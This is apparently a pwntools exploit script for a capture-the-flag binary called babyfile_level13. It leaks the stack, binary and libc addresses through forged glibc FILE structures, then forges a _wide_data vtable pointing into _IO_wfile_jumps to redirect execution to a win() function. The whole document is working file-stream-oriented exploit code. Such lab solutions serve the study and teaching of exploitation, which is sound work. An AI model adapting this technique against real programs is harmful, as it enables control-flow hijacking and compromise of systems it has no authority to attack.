# idea: *(leak + 0x98) = *main+201 -> calculate binary base
# new_note
# open_file -> write_fp -> write_file such that *main+201 is written into /tmp/babyfile.txt
# leak libc with same trick: *(leak + 0xc0) = *__libc_start_main + 243
# grab that by open() -> read() in this python script
# open_file -> write_fp -> write_file such that win() is called 

from pwn import *

context.arch = 'amd64'

p = process("/challenge/babyfile_level13")
#p = gdb.debug("/challenge/babyfile_level13")
binary = ELF("/challenge/babyfile_level13")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

# stack addr leak
p.recvuntil(b"[LEAK]")
p.recvuntil(b": ")
stack_leak = int(p.recvuntil(b'\n')[:-1], 16)

# leak binary addr
p.sendline(b'new_note')
p.sendline(b"0")
p.sendline(b"24")
print(p.recv())

p.sendline(b'open_file')
p.sendline(b'write_fp')
fs = FileStructure()
payload = fs.write(stack_leak + 0x98, 0x8)
p.send(payload)
p.sendline(b'write_file')
p.sendline(b'0')
p.recvuntil(b';\n')
main_leak = p.recv()[:8]

binary_base = unpack(main_leak, 'all') - binary.sym['main'] - 201
print("binary base = {}".format(hex(binary_base)))

win = binary_base + binary.sym['win']

# leak libc addr
p.sendline(b'new_note')
p.sendline(b"1")
p.sendline(b"24")
print(p.recv())

p.sendline(b'open_file')
p.sendline(b'write_fp')
fs = FileStructure()
payload = fs.write(stack_leak + 0xc8, 0x8)
p.send(payload)
p.sendline(b'write_file')
p.sendline(b'1')
p.recvuntil(b';\n')
libc_leak = p.recv()[:8]

libc_base = unpack(libc_leak, 'all') - libc.sym['__libc_start_main'] - 243
print("libc base = {}".format(hex(libc_base)))
libc.address = libc_base

# write wide_data to stack_leak - 0x500
_wide_vtable_offset = 0xe0
doallocbuf_call_offset = 0x68

p.sendline(b'open_file')
p.sendline(b'write_fp')
p.recvuntil(b'fp -> ')
#buf = int(p.recvuntil(b'\n')[:-1], 16)
#print(f'fp = {hex(buf)}')
buf = stack_leak + 0x1e0

_wide_data_vtable = (p64(buf + 0x8) + b"\x00" * doallocbuf_call_offset + p64(binary_base + binary.sym['win']))

fs = FileStructure()
payload = fs.read(buf, (0x8 + doallocbuf_call_offset + 0x8))
p.send(payload)
p.sendline(b'read_file')
p.sendline(b'1')
p.recv()
p.send(_wide_data_vtable)

# wide_data trick to win()
p.sendline(b"open_file")
p.sendline(b'write_fp')

fs = FileStructure()
fs.vtable = libc.sym['_IO_wfile_jumps'] + 24 - 0x38 # fwrite calling vtable + 0x3
#fs._lock = binary_base + binary.bss() + len(binary.section('.bss'))
fs._lock = buf + 0xe0
fs._wide_data = buf - 0xe0
payload = bytes(fs)

p.send(payload)

p.sendline(b'write_file')
p.sendline(b'1')
#print(p.recv())

p.interactive()
